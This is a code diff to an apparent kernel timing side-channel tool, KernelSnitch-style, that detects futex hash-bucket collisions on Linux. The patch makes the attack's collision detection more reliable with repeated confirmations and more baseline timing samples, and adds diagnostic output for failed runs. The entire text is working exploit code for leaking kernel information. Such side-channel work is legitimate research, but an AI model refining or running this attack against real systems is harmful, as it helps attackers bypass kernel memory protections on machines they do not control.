@@ -392,10 +392,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
-#endif
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
     size_t count = 0;
     size_t wanted;
@@ -405,9 +403,16 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(
-        __measure(ks, (size_t)&ks->futexes[0]),
-        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#ifndef KERNELSNITCH_BASELINE_SAMPLES
+#define KERNELSNITCH_BASELINE_SAMPLES 8
+#endif
+    size_t approx_time = (size_t)-1;
+    for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
+        size_t __s = MIN(
+            __measure(ks, (size_t)&ks->futexes[0]),
+            __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+        if (__s < approx_time) approx_time = __s;
+    }
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -424,7 +429,6 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
@@ -437,7 +441,6 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             }
             if (!confirmed)
                 continue;
-#endif
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
@@ -448,6 +451,22 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
+        if (getenv("KSNITCH_TIMING_DIAG")) {
+            size_t min_t = (size_t)-1, max_t = 0, sum_t = 0, n_t = 0;
+            for (size_t i = 2; i < ks->total_futexes; ++i) {
+                id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+                if (id >= FUTEX_SZ) break;
+                if (ks->times[i] == 0) continue;
+                if (ks->times[i] < min_t) min_t = ks->times[i];
+                if (ks->times[i] > max_t) max_t = ks->times[i];
+                sum_t += ks->times[i];
+                n_t++;
+            }
+            pr_warning("ksnitch timing diag approx_time=%zu threshold=%zu "
+                       "min=%zu max=%zu mean=%zu n=%zu\n",
+                       approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT,
+                       min_t, max_t, n_t ? sum_t / n_t : 0, n_t);
+        }
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
     __decrease(ks);
